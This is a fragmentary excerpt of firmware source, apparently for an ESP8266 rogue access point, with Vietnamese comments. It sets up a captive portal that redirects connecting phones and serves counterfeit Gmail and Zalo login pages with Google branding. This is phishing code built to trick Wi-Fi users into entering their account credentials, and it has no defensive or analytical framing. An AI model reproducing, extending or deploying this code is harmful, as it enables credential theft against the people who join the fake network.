...
//Sua thanh dia chi 8.8.8.8 thay vi 192.168.4.1 vi mot so thiet bi di dong bi ma hoa cung boi dia chi 8.8.8.8, neu de
//192.168.4.1 thi se khong chuyen huong den trang CAPTIVEPORTAL
...
//    Doan nay khi truy cap vao dia chi mac dinh 192.168.4.1 thi se hien thi giao dien "captiveportalhtml", thay vi ban dau
//    la no hien thi indexhtml
    server.on(String(SLASH).c_str(), HTTP_GET,
...
//              []() { sendProgmem(updatehtml, sizeof(updatehtml), W_HTML); });
    ...
    server.on(String(F("/gmail.html")).c_str(), HTTP_GET,
              []() { sendProgmem(gmailhtml, sizeof(gmailhtml), W_HTML); });
    ...
    server.on(String(F("/images/google.png")).c_str(), HTTP_GET,
              []() { sendProgmem(googlepng, sizeof(googlepng), W_PNG); });
    server.on(String(F("/images/google_icon.png")).c_str(), HTTP_GET,
              []() { sendProgmem(googleicon, sizeof(googleicon), W_PNG); });           
      ...
      if (settings.getCaptivePortal()) {
        ...
        case CAPTIVE_TYPE::ZALO:
          sendProgmem(captiveindexzalohtml, sizeof(captiveindexzalohtml),
                      W_HTML);
          break;
        case CAPTIVE_TYPE::GMAIL:
          sendProgmem(captiveindexgmailhtml, sizeof(captiveindexgmailhtml),
                      W_HTML);
          break;
